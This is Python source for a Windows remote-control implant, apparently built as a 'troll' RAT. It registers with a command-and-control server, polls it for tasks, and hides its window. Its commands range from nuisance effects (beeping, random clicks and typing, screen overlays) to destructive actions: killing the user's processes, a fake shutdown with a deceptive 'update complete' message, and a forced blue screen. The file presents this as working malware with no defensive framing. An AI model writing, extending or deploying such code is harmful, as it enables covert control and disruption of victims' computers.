# ==================================================================================================
# IMPORTS
# ==================================================================================================
import os
import sys
import socket
import uuid
import time
import requests
import threading
import subprocess
import random
import string
import tkinter as tk
try:
    import pyautogui
    import winsound
    import webbrowser
    import ctypes
    import psutil
except ImportError:
    pass

# ==================================================================================================
# CONFIGURATION
# ==================================================================================================
C2_URL = "http://127.0.0.1:5003" # Replaced by the builder
HEARTBEAT_INTERVAL = 5

# ==================================================================================================
# GLOBAL STATE VARIABLES
# ==================================================================================================
NOISE_ACTIVE = False
RANDOM_CLICKING_ACTIVE = False
RANDOM_TYPING_ACTIVE = False
CAPS_LOCK_SPAM_ACTIVE = False
OVERLAY_ACTIVE = False
USB_SPAM_ACTIVE = False # NEW
OVERLAY_WINDOW = None
GUI_ROOT = None

# ==================================================================================================
# ACTION FUNCTIONS
# ==================================================================================================

def show_popup(title="Message", message="Hello!", icon_style="info", button_style="ok"):
    ICON_MAP = {"none": 0x00, "error": 0x10, "question": 0x20, "warning": 0x30, "info": 0x40}
    BUTTON_MAP = {"ok": 0x00, "ok_cancel": 0x01, "abort_retry_ignore": 0x02, "yes_no_cancel": 0x03, "yes_no": 0x04, "retry_cancel": 0x05}
    style = ICON_MAP.get(icon_style.lower(), 0x40) | BUTTON_MAP.get(button_style.lower(), 0x00)
    threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, message, title, style), daemon=True).start()

def _noise_loop():
    while NOISE_ACTIVE: winsound.Beep(random.randint(200, 2000), 200); time.sleep(0.1)

def toggle_noise():
    global NOISE_ACTIVE
    NOISE_ACTIVE = not NOISE_ACTIVE
    if NOISE_ACTIVE: threading.Thread(target=_noise_loop, daemon=True).start()

def _usb_spam_loop():
    """NEW: Loop to play device connect/disconnect sounds."""
    while USB_SPAM_ACTIVE:
        winsound.PlaySound("SystemHand", winsound.SND_ALIAS) # Disconnect sound
        time.sleep(random.uniform(0.5, 2.0))
        winsound.PlaySound("SystemAsterisk", winsound.SND_ALIAS) # Connect sound
        time.sleep(random.uniform(0.5, 2.0))

def toggle_usb_spam():
    """NEW: Toggles the USB sound spam."""
    global USB_SPAM_ACTIVE
    USB_SPAM_ACTIVE = not USB_SPAM_ACTIVE
    if USB_SPAM_ACTIVE: threading.Thread(target=_usb_spam_loop, daemon=True).start()

def _caps_lock_loop():
    while CAPS_LOCK_SPAM_ACTIVE:
        if ctypes.windll.user32.GetKeyState(0x14) == 0:
            ctypes.windll.user32.keybd_event(0x14, 0x45, 1, 0); ctypes.windll.user32.keybd_event(0x14, 0x45, 3, 0)
        time.sleep(1)

def toggle_caps_lock_spam():
    global CAPS_LOCK_SPAM_ACTIVE
    CAPS_LOCK_SPAM_ACTIVE = not CAPS_LOCK_SPAM_ACTIVE
    if CAPS_LOCK_SPAM_ACTIVE: threading.Thread(target=_caps_lock_loop, daemon=True).start()

def _create_overlay(color='black', alpha=0.5):
    global OVERLAY_WINDOW
    if OVERLAY_WINDOW: OVERLAY_WINDOW.destroy()
    OVERLAY_WINDOW = tk.Toplevel(GUI_ROOT)
    OVERLAY_WINDOW.attributes('-fullscreen', True); OVERLAY_WINDOW.attributes('-alpha', alpha)
    OVERLAY_WINDOW.attributes("-topmost", True); OVERLAY_WINDOW.configure(bg=color)
    OVERLAY_WINDOW.overrideredirect(True)

def _hide_overlay():
    global OVERLAY_WINDOW
    if OVERLAY_WINDOW: OVERLAY_WINDOW.destroy(); OVERLAY_WINDOW = None

def toggle_overlay(color='black', alpha=0.5):
    global OVERLAY_ACTIVE
    OVERLAY_ACTIVE = not OVERLAY_ACTIVE
    if OVERLAY_ACTIVE: GUI_ROOT.after(0, lambda: _create_overlay(color=color, alpha=alpha))
    else: GUI_ROOT.after(0, _hide_overlay)

def open_website(url="https://google.com"):
    webbrowser.open(url)

def open_cd_tray():
    try:
        ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
        time.sleep(3); ctypes.windll.winmm.mciSendStringW("set cdaudio door closed", None, 0, None)
    except: pass

def _random_clicking_loop():
    w, h = pyautogui.size()
    while RANDOM_CLICKING_ACTIVE:
        pyautogui.click(random.randint(0, w), random.randint(0, h)); time.sleep(random.uniform(0.5, 2.0))
def toggle_random_clicking():
    global RANDOM_CLICKING_ACTIVE
    RANDOM_CLICKING_ACTIVE = not RANDOM_CLICKING_ACTIVE
    if RANDOM_CLICKING_ACTIVE: threading.Thread(target=_random_clicking_loop, daemon=True).start()

def _random_typing_loop():
    while RANDOM_TYPING_ACTIVE:
        pyautogui.write(random.choice(string.ascii_letters + string.digits), interval=random.uniform(0.1, 0.3))
        time.sleep(random.uniform(0.5, 1.5))
def toggle_random_typing():
    global RANDOM_TYPING_ACTIVE
    RANDOM_TYPING_ACTIVE = not RANDOM_TYPING_ACTIVE
    if RANDOM_TYPING_ACTIVE: threading.Thread(target=_random_typing_loop, daemon=True).start()

# --- NEW DESTRUCTIVE / SYSTEM ACTIONS ---
def fake_shutdown(message="Critical system update in progress..."):
    """NEW: Initiates a shutdown that is later aborted."""
    def _shutdown_sequence():
        subprocess.run(f'shutdown /s /t 60 /c "{message}"', shell=True, capture_output=True)
        time.sleep(30) # Wait 30 seconds
        subprocess.run('shutdown /a', shell=True, capture_output=True)
        show_popup(title="Update Complete", message="The critical system update has been successfully installed.", icon_style="info")
    threading.Thread(target=_shutdown_sequence, daemon=True).start()

def toggle_desktop_icons():
    """NEW: Hides or shows all desktop icons."""
    # Find the handle for the desktop icons window
    handle = ctypes.windll.user32.FindWindowW("Progman", None)
    handle = ctypes.windll.user32.FindWindowExW(handle, 0, "SHELLDLL_DefView", None)
    handle = ctypes.windll.user32.FindWindowExW(handle, 0, "FolderView", None)
    # Check if it's visible and toggle
    if ctypes.windll.user32.IsWindowVisible(handle):
        ctypes.windll.user32.ShowWindow(handle, 0) # Hide
    else:
        ctypes.windll.user32.ShowWindow(handle, 5) # Show

def kill_tasks():
    """NEW: Attempts to kill all non-critical user processes."""
    critical_procs = ['csrss.exe', 'wininit.exe', 'winlogon.exe', 'lsass.exe', 'services.exe', 'smss.exe', 'explorer.exe']
    current_user = os.getlogin()
    for proc in psutil.process_iter(['pid', 'name', 'username']):
        try:
            if proc.info['username'] and current_user in proc.info['username'] and proc.info['name'].lower() not in critical_procs:
                p = psutil.Process(proc.info['pid'])
                p.terminate()
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

def bsod():
    """NEW: Triggers a Blue Screen of Death. Requires admin rights."""
    nullptr = ctypes.pointer(ctypes.c_int())
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, nullptr, nullptr, 6, ctypes.byref(ctypes.c_uint()))

# ==================================================================================================
# C2 COMMUNICATION & TASK PROCESSING
# ==================================================================================================
def process_tasks(tasks):
    if not tasks: return
    for task in tasks:
        command, args = task.get("command"), task.get("args", {})
        print(f"[*] Received command: {command} with args: {args}")
        ACTION_MAP = {
            # Old
            "show_popup": show_popup, "toggle_noise": toggle_noise, "toggle_caps_lock_spam": toggle_caps_lock_spam,
            "toggle_overlay": toggle_overlay, "hide_overlay": lambda: GUI_ROOT.after(0, _hide_overlay),
            "open_website": open_website, "open_cd_tray": open_cd_tray, "toggle_random_clicking": toggle_random_clicking,
            "toggle_random_typing": toggle_random_typing,
            # New
            "toggle_usb_spam": toggle_usb_spam, "fake_shutdown": fake_shutdown, "toggle_desktop_icons": toggle_desktop_icons,
            "kill_tasks": kill_tasks, "bsod": bsod,
        }
        if command in ACTION_MAP:
            try: ACTION_MAP[command](**args)
            except Exception as e: print(f"[!] Error executing '{command}': {e}")

def c2_communication_loop():
    session_id, hostname = str(uuid.uuid4()), socket.gethostname()
    try: requests.post(f"{C2_URL}/api/register", json={"session_id": session_id, "hostname": hostname}, timeout=10)
    except: pass
    while True:
        try:
            response = requests.post(f"{C2_URL}/api/heartbeat", json={"session_id": session_id}, timeout=10)
            if response.status_code == 200 and "tasks" in (data := response.json()):
                process_tasks(data["tasks"])
        except: pass
        time.sleep(HEARTBEAT_INTERVAL)

# ==================================================================================================
# MAIN EXECUTION
# ==================================================================================================
if __name__ == "__main__":
    c2_thread = threading.Thread(target=c2_communication_loop, daemon=True)
    c2_thread.start()
    GUI_ROOT = tk.Tk()
    GUI_ROOT.withdraw()
    GUI_ROOT.mainloop()